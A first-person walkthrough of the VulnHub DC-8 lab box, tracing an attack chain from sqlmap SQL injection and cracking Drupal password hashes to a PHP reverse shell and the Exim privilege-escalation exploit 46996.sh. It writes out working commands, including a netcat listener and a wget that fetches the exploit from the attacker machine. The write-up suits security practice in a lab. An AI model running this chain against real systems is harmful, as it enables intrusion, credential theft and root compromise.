# 🖥️ DC-8 VulnHub Walkthrough

```text
╔══════════════════════════════════════╗
║            DC-8 PENTEST              ║
║     SQLi → Drupal → Exim → Root      ║
╚══════════════════════════════════════╝
```

![VulnHub](https://img.shields.io/badge/Platform-VulnHub-blue)
![Drupal](https://img.shields.io/badge/CMS-Drupal-0678BE)
![SQLi](https://img.shields.io/badge/Attack-SQL_Injection-red)
![Status](https://img.shields.io/badge/Status-Rooted-success)

## >_ Introduction

After working through the previous DC machines, I moved on to **DC-8**.

This box was especially useful for practising SQL injection because one small URL parameter eventually gave me access to the Drupal database.

From there, the challenge moved from SQL injection to password cracking, Drupal exploitation and finally Linux privilege escalation.

My path was:

```text
 NMAP
   │
   ▼
 Drupal Website
   │
   ▼
 ?nid=1
   │
   ▼
 SQL Injection
   │
   ▼
 Drupal Database
   │
   ▼
 Password Hash
   │
   ▼
 John the Ripper
   │
   ▼
 Drupal Login
   │
   ▼
 Reverse Shell
   │
   ▼
 Exim Exploit
   │
   ▼
 ROOT
```

---

## >_ 01 — Target Discovery

I started by switching to root:

```bash
sudo -i
```

Then scanned the local network:

```bash
nmap -sN 192.168.56.0/24
```

I identified the target as:

```text
192.168.56.119
```

The scan showed two important services:

```text
22  → SSH
80  → HTTP
```

HTTP gave me somewhere to start, so I opened the target in the browser.

---

## >_ 02 — Web Enumeration

The website showed the DC-8 homepage.

I checked the source code first, but nothing immediately stood out.

Then I checked:

```text
http://192.168.56.119/robots.txt
```

Again, nothing particularly useful.

Next came Nikto:

```bash
nikto -h 192.168.56.119
```

Nikto revealed an interesting user path:

```text
/user/
```

I visited:

```text
http://192.168.56.119/user/
```

This gave me a Drupal login page.

I tried some common credentials, but none worked.

I also ran directory enumeration, but I still wasn't getting the entry point I wanted.

So I went back to the homepage and looked at it more carefully.

---

## >_ 03 — Finding the SQL Injection Point

There was a **Welcome to DC-8** link on the homepage.

After clicking it, I noticed something interesting in the URL:

```text
http://192.168.56.119/?nid=1
```

The parameter immediately caught my attention:

```text
nid=1
```

Instead of jumping straight into Burp Suite, I tested the parameter using SQLmap.

```bash
sqlmap -u http://192.168.56.119/?nid=1
```

Then I enumerated the databases:

```bash
sqlmap -u http://192.168.56.119/?nid=1 --dbs
```

I found:

```text
[*] d7db
[*] information_schema
```

`d7db` looked like the Drupal database, so that became my target.

---

## >_ 04 — Digging Through the Database

Next I enumerated its tables:

```bash
sqlmap -u http://192.168.56.119/?nid=1 -D d7db --tables
```

There were many tables.

But one was obviously interesting:

```text
users
```

So I dumped it:

```bash
sqlmap -u http://192.168.56.119/?nid=1 -D d7db -T users --dump
```

And now things got interesting.

I recovered user information including:

```text
Username : admin
Email    : dcau-user@outlook.com

Username : john
```

The passwords weren't plaintext.

They were Drupal password hashes.

```text
admin
$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z

john
$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
```

So the next problem was clear:

```text
HASH
  ↓
???
  ↓
PASSWORD
```

---

## >_ 05 — Cracking the Password

I saved the hashes into a file using Vim.

```bash
vim pass
```

After saving them, I used **John the Ripper** with `rockyou.txt`:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt pass
```

John wasn't able to crack everything, but it successfully cracked the password belonging to `john`.

To display the result:

```bash
john --show pass
```

Result:

```text
john : turtle
```

That was enough.

```text
[+] Username: john
[+] Password: turtle
```

I returned to the Drupal login page and successfully logged in.

---

## >_ 06 — From Drupal to a Shell

After logging in, I explored what the user could access.

The **Contact Us** area and its webform became particularly interesting.

I found that I could use the available functionality to introduce PHP reverse-shell code.

Before executing the payload, I started my Netcat listener:

```bash
sudo nc -nlvp 5555
```

I changed the reverse-shell IP address to my Kali machine:

```text
192.168.56.107
```

and used my chosen listener port.

After triggering it:

```text
[+] Reverse shell received
```

Now I had terminal access as the web server user.

---

## >_ 07 — Stabilizing the Shell

I checked the available Python version and upgraded the basic shell using:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gave me a much more usable interactive shell.

Then I moved to:

```bash
cd /var/www/html
```

At this point, my next objective was privilege escalation.

---

## >_ 08 — Searching for SUID Files

I searched the system for files with the SUID permission:

```bash
find / -perm -u=s -type f 2>/dev/null
```

One result stood out:

```text
/usr/sbin/exim4
```

That was interesting.

Exim is a mail transfer agent, and because of the way it was configured/versioned on this machine, I started looking for known local privilege-escalation exploits.

---

## >_ 09 — Searching Exploit-DB

I used SearchSploit:

```bash
searchsploit exim
```

Among the results I found an exploit that looked applicable.

I copied it to my Kali machine:

```bash
searchsploit -m 46996.sh
```

Now I needed to transfer the exploit from Kali to DC-8.

---

## >_ 10 — Transferring the Exploit

On Kali I started a simple Python HTTP server:

```bash
python -m http.server 8096
```

Then, from the reverse shell on DC-8, I downloaded the exploit:

```bash
wget http://192.168.56.107:8096/46996.sh -O /tmp/46996.sh
```

I moved into `/tmp`:

```bash
cd /tmp
```

Then inspected it:

```bash
cat 46996.sh
```

After checking the script, I made it executable:

```bash
chmod +x /tmp/46996.sh
```

And checked its permissions:

```bash
ls -l /tmp/46996.sh
```

Now it was ready.

---

## >_ 11 — Root

I executed the exploit using its Netcat mode:

```bash
./46996.sh -m netcat
```

And this was the moment I was waiting for.

```text
┌──────────────────────────┐
│      ROOT OBTAINED       │
└──────────────────────────┘
```

I moved to the root directory:

```bash
cd /root
ls
```

There it was:

```text
flag.txt
```

Final flag obtained.

DC-8 completed.

---

## >_ Full Attack Chain

```text
┌──────────────────────┐
│ 192.168.56.119       │
└──────────┬───────────┘
           │
           ▼
     Drupal Website
           │
           ▼
       ?nid=1
           │
           ▼
    SQL Injection
           │
           ▼
        SQLmap
           │
           ▼
      d7db.users
           │
           ▼
   Drupal Password Hash
           │
           ▼
    John the Ripper
           │
           ▼
      john:turtle
           │
           ▼
      Drupal Login
           │
           ▼
     PHP Reverse Shell
           │
           ▼
        www-data
           │
           ▼
       SUID Search
           │
           ▼
    /usr/sbin/exim4
           │
           ▼
     Exim Exploit
           │
           ▼
      [ ROOT ]
```

---

## >_ What I Learned

DC-8 gave me a nice attack chain because every stage led naturally into the next one.

The biggest lesson for me was paying attention to URL parameters.

This:

```text
?nid=1
```

looked simple, but it eventually led to database access.

From this box I practised:

- Network enumeration with Nmap.
- Web enumeration with Nikto and directory scanning.
- Identifying interesting URL parameters.
- Testing SQL injection with SQLmap.
- Enumerating databases and tables.
- Extracting Drupal password hashes.
- Cracking passwords with John the Ripper.
- Using `rockyou.txt`.
- Getting a PHP reverse shell.
- Upgrading a shell using Python PTY.
- Searching for SUID binaries.
- Finding known exploits with SearchSploit.
- Transferring files with a Python HTTP server.
- Using a local privilege-escalation exploit to obtain root.

---

## >_ Tools Used

```text
╭──────────────────┬──────────────────────────────╮
│ TOOL             │ PURPOSE                      │
├──────────────────┼──────────────────────────────┤
│ Nmap             │ Network enumeration          │
│ Nikto            │ Web server enumeration       │
│ SQLmap           │ SQL injection / DB dumping   │
│ Vim              │ Saving password hashes       │
│ John the Ripper  │ Password cracking            │
│ Netcat           │ Reverse shell listener       │
│ SearchSploit     │ Finding Exim exploit         │
│ Python           │ Shell PTY + HTTP server      │
│ Wget             │ Exploit transfer             │
╰──────────────────┴──────────────────────────────╯
```

---

```text
DC-8 // FINAL STATUS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Target       : 192.168.56.119
CMS          : Drupal
Initial Path : SQL Injection
Credential   : john:turtle
Shell        : Web Server User
Privesc      : Exim
Final Access : ROOT

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
              PWNED ✓
```

> This walkthrough documents my experience solving DC-8 in my own lab environment for educational and cybersecurity practice purposes.
